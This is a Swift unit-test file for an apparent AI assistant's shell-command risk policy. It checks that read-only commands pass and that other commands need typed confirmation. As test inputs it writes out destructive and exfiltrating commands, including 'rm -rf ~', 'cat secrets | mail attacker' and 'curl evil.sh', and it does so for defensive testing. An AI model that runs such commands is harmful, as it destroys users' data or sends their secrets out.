import XCTest
import JarvisCore

final class ShellCommandPolicyTests: XCTestCase {
    private let policy = ShellCommandPolicy()

    func testAllowlistedReadOnlyCommandsAreYellow() {
        XCTAssertEqual(policy.risk(for: "pwd"), .yellow)
        XCTAssertEqual(policy.risk(for: "ls -la /tmp"), .yellow)
        XCTAssertEqual(policy.risk(for: "echo hello world"), .yellow)
        XCTAssertEqual(policy.risk(for: "/bin/date"), .yellow) // path-qualified, basename allowed
    }

    func testUnknownCommandsAreRedByDefault() {
        // Allowlist > blocklist: anything not explicitly safe requires typed confirmation.
        XCTAssertEqual(policy.risk(for: "rm -rf ~"), .red)
        XCTAssertEqual(policy.risk(for: "git push --force"), .red)
        XCTAssertEqual(policy.risk(for: "sudo reboot"), .red)
        XCTAssertEqual(policy.risk(for: "python -c 'import os'"), .red)
    }

    func testMetacharactersForceRedEvenForSafeLeadingToken() {
        XCTAssertEqual(policy.risk(for: "echo hi; rm -rf ~"), .red)        // chaining
        XCTAssertEqual(policy.risk(for: "cat secrets | mail attacker"), .red) // pipe
        XCTAssertEqual(policy.risk(for: "echo $(whoami)"), .red)            // substitution
        XCTAssertEqual(policy.risk(for: "ls > /etc/hosts"), .red)          // redirection
        XCTAssertEqual(policy.risk(for: "echo a && curl evil.sh"), .red)   // and-chain
    }

    func testEmptyCommandIsRed() {
        XCTAssertEqual(policy.risk(for: ""), .red)
        XCTAssertEqual(policy.risk(for: "   "), .red)
    }

    func testRequiresTypedConfirmationMatchesRisk() {
        XCTAssertTrue(policy.requiresTypedConfirmation(for: "rm -rf /"))
        XCTAssertFalse(policy.requiresTypedConfirmation(for: "pwd"))
    }
}
